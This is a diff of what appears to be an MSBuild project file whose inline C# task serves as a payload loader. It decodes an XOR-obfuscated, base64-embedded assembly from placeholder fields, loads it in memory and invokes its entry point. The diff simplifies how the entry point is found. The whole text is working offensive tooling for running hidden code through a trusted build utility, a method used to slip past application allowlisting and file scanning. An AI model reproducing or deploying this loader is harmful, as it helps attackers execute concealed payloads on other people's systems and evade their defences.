@@ -10,7 +10,6 @@
     <Reference Include="System.Management.Automation"/>
       <Code Type="Class" Language="cs">
         <![CDATA[
-		
 using System;
 using System.Reflection;
 using System.Text;
@@ -84,52 +83,33 @@ namespace csharp
 
             try
             {
-		string data = "~~ASSEMBLY~~";
-		string key = "~~KEY~~";
+                string data = "~~ASSEMBLY~~";
+                string key = "~~KEY~~";
                 assembly = Assembly.Load(Zor(Convert.FromBase64String(data), Encoding.UTF8.GetBytes(key)));
             }
             catch (Exception e)
             {
                 Console.WriteLine("[!] Could not load assembly. Returned the following error:\n\n");
-				Console.WriteLine(e);
+                Console.WriteLine(e);
                 Environment.Exit(1);
             }
-
-            Type[] types = assembly.GetExportedTypes();
-
-            foreach (Type type in types)
+            
+            if (args.Length == 0)
             {
-                MethodInfo[] methods = type.GetMethods();
-                foreach (MethodInfo method in methods)
-                {
-                    if (method.Name == "Main")
-                    {
-                        foundMain = true;
-                        if (!type.Attributes.HasFlag(TypeAttributes.Abstract))
-                        {
-                            execMain = true;
-                            object instance = Activator.CreateInstance(type);
-                            if (args.Length == 0)
-                            {
-                                Console.WriteLine("[*] Running assembly with no arguments");
-                            }
-                            else
-                            {
-                                Console.WriteLine("[*] Running assembly with arguments: " + string.Join(" ", args));
-                            }
-                            var output = method.Invoke(instance, new object[] { args });
-                            Console.WriteLine(output);
-                        }
-                    }
-                }
+                Console.WriteLine("[*] Running assembly with no arguments");
             }
-            if (!foundMain)
+            else
             {
-                Console.WriteLine("[!] No public \"Main()\" function found in assembly. Did you make sure to set the class as public?");
+                Console.WriteLine("[*] Running assembly with arguments: " + string.Join(" ", args));
             }
-            else if (!execMain)
-            {
-                Console.WriteLine("[!] Found public \"Main()\" function but could not execute it. Make your assembly's CPU arch matches this program.");
+            try {
+                var output = assembly.EntryPoint.Invoke(null, new object[] { args });
+                Console.WriteLine(output);
+            }
+            catch (Exception e) {
+                Console.WriteLine("[!] Could not invoke assembly. Returned the following error:\n\n");
+                Console.WriteLine(e);
+                Environment.Exit(1);
             }
         }
     }
@@ -142,7 +122,6 @@ namespace csharp
         }
    }
 }
-
         ]]>
       </Code>
     </Task>
